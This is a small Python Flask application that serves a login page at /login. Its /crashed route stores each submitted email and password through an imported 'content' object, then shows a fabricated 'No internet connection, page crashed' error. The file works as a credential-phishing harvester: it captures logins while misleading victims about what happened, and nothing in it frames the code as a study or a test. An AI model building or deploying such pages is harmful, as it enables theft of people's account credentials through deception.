from flask import Flask, render_template, request
from untitled import content
from selenium import webdriver
from selenium.webdriver.common.keys import Keys



import os
print(os.getcwd())

c = content

app = Flask(__name__)




@app.route('/login')
def index():
	return render_template('index.html')

@app.route('/crashed', methods = ['POST'])
def details():
	user = str(request.form.get('email'))	
	passwrd = str(request.form.get('password'))


	
	c.put(user, passwrd)

	return 'Error : 0x00000012 -> No internet connection\n page crashed :('




	
if __name__ == '__main__':
	
	app.run(host = '127.0.0.1', port = '1900')
	


	



	